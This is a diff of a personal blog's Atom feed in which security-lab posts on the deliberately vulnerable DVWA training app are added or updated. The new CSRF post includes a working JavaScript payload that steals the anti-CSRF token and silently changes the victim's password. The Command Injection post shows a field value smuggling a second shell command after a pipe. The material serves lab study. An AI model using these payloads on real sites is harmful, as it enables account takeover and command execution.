@@ -1,4 +1,70 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://songzy12.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://songzy12.github.io/" rel="alternate" type="text/html" /><updated>2020-07-09T22:40:52+08:00</updated><id>http://songzy12.github.io/feed.xml</id><title type="html">Zhengyang Song’s Secret Base</title><subtitle>All those little bugs I have ever met.</subtitle><author><name>Zhengyang Song</name></author><entry><title type="html">Command Injection</title><link href="http://songzy12.github.io/2020/07/09/command-injection.html" rel="alternate" type="text/html" title="Command Injection" /><published>2020-07-09T21:01:48+08:00</published><updated>2020-07-09T21:01:48+08:00</updated><id>http://songzy12.github.io/2020/07/09/command-injection</id><content type="html" xml:base="http://songzy12.github.io/2020/07/09/command-injection.html">&lt;p&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/index.php&quot;&gt;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/index.php&lt;/a&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://songzy12.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://songzy12.github.io/" rel="alternate" type="text/html" /><updated>2020-07-12T15:40:15+08:00</updated><id>http://songzy12.github.io/feed.xml</id><title type="html">Zhengyang Song’s Secret Base</title><subtitle>All those little bugs I have ever met.</subtitle><author><name>Zhengyang Song</name></author><entry><title type="html">CSRF</title><link href="http://songzy12.github.io/2020/07/09/csrf.html" rel="alternate" type="text/html" title="CSRF" /><published>2020-07-09T23:22:25+08:00</published><updated>2020-07-09T23:22:25+08:00</updated><id>http://songzy12.github.io/2020/07/09/csrf</id><content type="html" xml:base="http://songzy12.github.io/2020/07/09/csrf.html">&lt;p&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/csrf/index.php&quot;&gt;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/csrf/index.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2&gt;Low&lt;/h2&gt;
+
+&lt;h3&gt;Source&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;Medium&lt;/h2&gt;
+
+&lt;h3&gt;Source&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;    // Checks to see where the request came from
+    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;High&lt;/h2&gt;
+
+&lt;h3&gt;Source&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;XSS&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;var theUrl = 'http://localhost:8888/dvwa/vulnerabilities/csrf/';
+var pass = 'password';
+if (window.XMLHttpRequest){
+    xmlhttp=new XMLHttpRequest();
+}else{
+    xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+}
+xmlhttp.withCredentials = true;
+var hacked = false;
+xmlhttp.onreadystatechange=function(){
+    if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200)
+    {
+        var text = xmlhttp.responseText;
+        var regex = /user_token\' value\=\'(.*?)\' \/\&amp;gt;/;
+        var match = text.match(regex);
+        var token = match[1];
+        var new_url = 'http://pentest.wp/dvwa/vulnerabilities/csrf/?user_token='+token+'&amp;amp;password_new='+pass+'&amp;amp;password_conf='+pass+'&amp;amp;Change=Change'
+        if(!hacked){
+            alert('Got token:' + match[1]);
+            hacked = true;
+            xmlhttp.open(&quot;GET&quot;, new_url, false );
+            xmlhttp.send();  
+        }
+        count++;
+    }
+};
+xmlhttp.open(&quot;GET&quot;, theUrl, false );
+xmlhttp.send();  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;Impossible&lt;/h2&gt;
+
+&lt;h3&gt;Source&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;    // Get input
+    $pass_curr = $_GET[ 'password_current' ];
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
+&lt;/code&gt;&lt;/pre&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/csrf/index.php</summary></entry><entry><title type="html">Command Injection</title><link href="http://songzy12.github.io/2020/07/09/command-injection.html" rel="alternate" type="text/html" title="Command Injection" /><published>2020-07-09T21:01:48+08:00</published><updated>2020-07-09T21:01:48+08:00</updated><id>http://songzy12.github.io/2020/07/09/command-injection</id><content type="html" xml:base="http://songzy12.github.io/2020/07/09/command-injection.html">&lt;p&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/index.php&quot;&gt;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/index.php&lt;/a&gt;&lt;/p&gt;
 
 &lt;h2&gt;Low&lt;/h2&gt;
 
@@ -72,6 +138,17 @@
 &lt;p&gt;Fill in &lt;code&gt;baidu.com |lsb_release -a&lt;/code&gt;.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;ping  -c 4 baidu.com |lsb_release -a
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;Impossible&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;    // Split the IP into 4 octects
+    $octet = explode( &quot;.&quot;, $target );
+
+    // Check IF each octet is an integer
+    if( ( is_numeric( $octet[0] ) ) &amp;amp;&amp;amp; ( is_numeric( $octet[1] ) ) &amp;amp;&amp;amp; ( is_numeric( $octet[2] ) ) &amp;amp;&amp;amp; ( is_numeric( $octet[3] ) ) &amp;amp;&amp;amp; ( sizeof( $octet ) == 4 ) ) {
+        // If all 4 octets are int's put the IP back together.
+        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
 &lt;/code&gt;&lt;/pre&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/index.php</summary></entry><entry><title type="html">Brute Force</title><link href="http://songzy12.github.io/2020/07/03/brute-force.html" rel="alternate" type="text/html" title="Brute Force" /><published>2020-07-03T22:26:03+08:00</published><updated>2020-07-03T22:26:03+08:00</updated><id>http://songzy12.github.io/2020/07/03/brute-force</id><content type="html" xml:base="http://songzy12.github.io/2020/07/03/brute-force.html">&lt;p&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php&quot;&gt;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php&lt;/a&gt;&lt;/p&gt;
 
 &lt;h2&gt;Low&lt;/h2&gt;
@@ -189,6 +266,20 @@
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;pre&gt;&lt;code&gt;name='user_token' value='(.*?)'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;Impossible&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;    // Check the database (Check user information)
+    $data = $db-&amp;gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
+
+        // Calculate when the user would be allowed to login again
+        $last_login = strtotime( $row[ 'last_login' ] );
+        $timeout    = $last_login + ($lockout_time * 60);
+        $timenow    = time();
+
+        // Login failed
+        sleep( rand( 2, 4 ) );
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;h2&gt;More&lt;/h2&gt;
@@ -373,33 +464,4 @@ However, although optimal among methods encoding symbols separately, Huffman cod
 
 &lt;p&gt;&lt;img src=&quot;/img/Huffman_tree.svg.png&quot; alt=&quot;Huffman Tree&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/Huffman_tree-Code.png&quot; alt=&quot;Huffman Code&quot; /&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://en.wikipedia.org/wiki/Huffman_coding</summary></entry><entry><title type="html">LZW</title><link href="http://songzy12.github.io/2020/06/25/lzw.html" rel="alternate" type="text/html" title="LZW" /><published>2020-06-25T17:26:03+08:00</published><updated>2020-06-25T17:26:03+08:00</updated><id>http://songzy12.github.io/2020/06/25/lzw</id><content type="html" xml:base="http://songzy12.github.io/2020/06/25/lzw.html">&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch&quot;&gt;https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch&lt;/a&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;&lt;p&gt;It is the algorithm of the widely used Unix file compression utility compress and is used in the GIF image format.&lt;/p&gt;&lt;/blockquote&gt;
-
-&lt;h2&gt;Algorithm&lt;/h2&gt;
-
-&lt;p&gt;A high level view of the encoding algorithm is shown here:&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;Initialize the dictionary to contain all strings of length one.&lt;/li&gt;
-&lt;li&gt;Find the longest string W in the dictionary that matches the current input.&lt;/li&gt;
-&lt;li&gt;Emit the dictionary index for W to output and remove W from the input.&lt;/li&gt;
-&lt;li&gt;Add W followed by the next symbol in the input to the dictionary.&lt;/li&gt;
-&lt;li&gt;Go to Step 2.&lt;/li&gt;
-&lt;/ol&gt;
-
-
-&lt;h2&gt;Example&lt;/h2&gt;
-
-&lt;p&gt;&lt;code&gt;TOBEORNOTTOBEORTOBEORNOT#&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/LZW-Dict.png&quot; alt=&quot;Dict&quot; /&gt;&lt;/p&gt;
-
-&lt;h3&gt;Encoding&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/LZW-Encoding.png&quot; alt=&quot;Dict&quot; /&gt;&lt;/p&gt;
-
-&lt;h3&gt;Decoding&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/LZW-Decoding.png&quot; alt=&quot;Dict&quot; /&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/img/Huffman_tree-Code.png&quot; alt=&quot;Huffman Code&quot; /&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://en.wikipedia.org/wiki/Huffman_coding</summary></entry></feed>
